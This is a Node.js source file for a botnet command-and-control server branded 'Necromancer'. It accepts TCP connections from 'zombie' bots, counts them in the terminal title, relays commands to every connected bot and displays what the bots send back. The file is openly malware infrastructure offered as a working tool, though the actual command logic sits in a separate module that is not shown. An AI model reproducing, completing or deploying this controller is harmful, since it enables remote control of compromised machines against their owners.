import net from "net";
import { prompt } from "./commands.js";
import dotenv from "dotenv";

dotenv.config({ path: "../config/.env" });

let clients, clientInstances, silent;

const clientModules = {
	clients: (clients = []),
	clientInstances: clientInstances,
	silent: (silent = false),
};

const PORT = process.env.PORT;
const IP = process.env.IP;

function setTerminalTitle() {
	process.stdout.write(
		String.fromCharCode(27) +
			"]0;" +
			`Necromancer | Zombies: ${clients.length}` +
			String.fromCharCode(7)
	);
}
setTerminalTitle();

function broadcast(message) {
	clientModules.clientInstances.forEach((client) => {
		client.write(message);
	});
	process.stdout.write(message);
}

net.createServer((socket) => {
	// Identify client
	socket.name = `${socket.remoteAddress}:${socket.remotePort}`;

	// On client connect
	clientModules.clients.push(socket);
	clientModules.clientInstances = [...clientModules.clients];

	setTerminalTitle();

	console.log(`\x1b[91m\nBot ${socket.name} has connected.\x1b[0m`);

	socket.on("data", (data) => {
		if (!clientModules.silent)
			broadcast(`\n\x1b[33m[BOT ${socket.name}]\x1b[0m ` + data, socket);
		prompt();
	});

	socket.on("error" || "end", () => {
		clientDisconnected();
	});

	function clientDisconnected() {
		clientModules.clients.splice(clientModules.clients.indexOf(socket), 1);
		clientModules.clientInstances = [...clientModules.clients];
		console.log(`\x1b[91m\nBot ${socket.name} has disconnected.\x1b[0m`);
		if (clients.length < 1)
			console.log("\x1b[91mWaiting for clients to connect.\x1b[0m");
		setTerminalTitle();
	}
}).listen(PORT, IP);

console.clear();
console.log(`\x1b[31m
 ███▄    █  ▄████▄   ██▀███   ███▄ ▄███▓ ███▄    █  ▄████▄   ██▀███  
 ██ ▀█   █ ▒██▀ ▀█  ▓██ ▒ ██▒▓██▒▀█▀ ██▒ ██ ▀█   █ ▒██▀ ▀█  ▓██ ▒ ██▒
▓██  ▀█ ██▒▒▓█    ▄ ▓██ ░▄█ ▒▓██    ▓██░▓██  ▀█ ██▒▒▓█    ▄ ▓██ ░▄█ ▒
▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒██▀▀█▄  ▒██    ▒██ ▓██▒  ▐▌██▒▒▓▓▄ ▄██▒▒██▀▀█▄  
▒██░   ▓██░▒ ▓███▀ ░░██▓ ▒██▒▒██▒   ░██▒▒██░   ▓██░▒ ▓███▀ ░░██▓ ▒██▒
░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░░ ▒░   ░  ░░ ▒░   ▒ ▒ ░ ░▒ ▒  ░░ ▒▓ ░▒▓░
░ ░░   ░ ▒░  ░  ▒     ░▒ ░ ▒░░  ░      ░░ ░░   ░ ▒░  ░  ▒     ░▒ ░ ▒░
   ░   ░ ░ ░          ░░   ░ ░      ░      ░   ░ ░ ░          ░░   ░ 
         ░ ░ ░         ░            ░            ░ ░ ░         ░     
           ░                                       ░                
\x1b[0m`);
console.log(`\x1b[91mServer running on ${IP}:${PORT}.\x1b[0m`);
console.log("\x1b[91mWaiting for connections.\x1b[0m");

export { clientModules, broadcast };
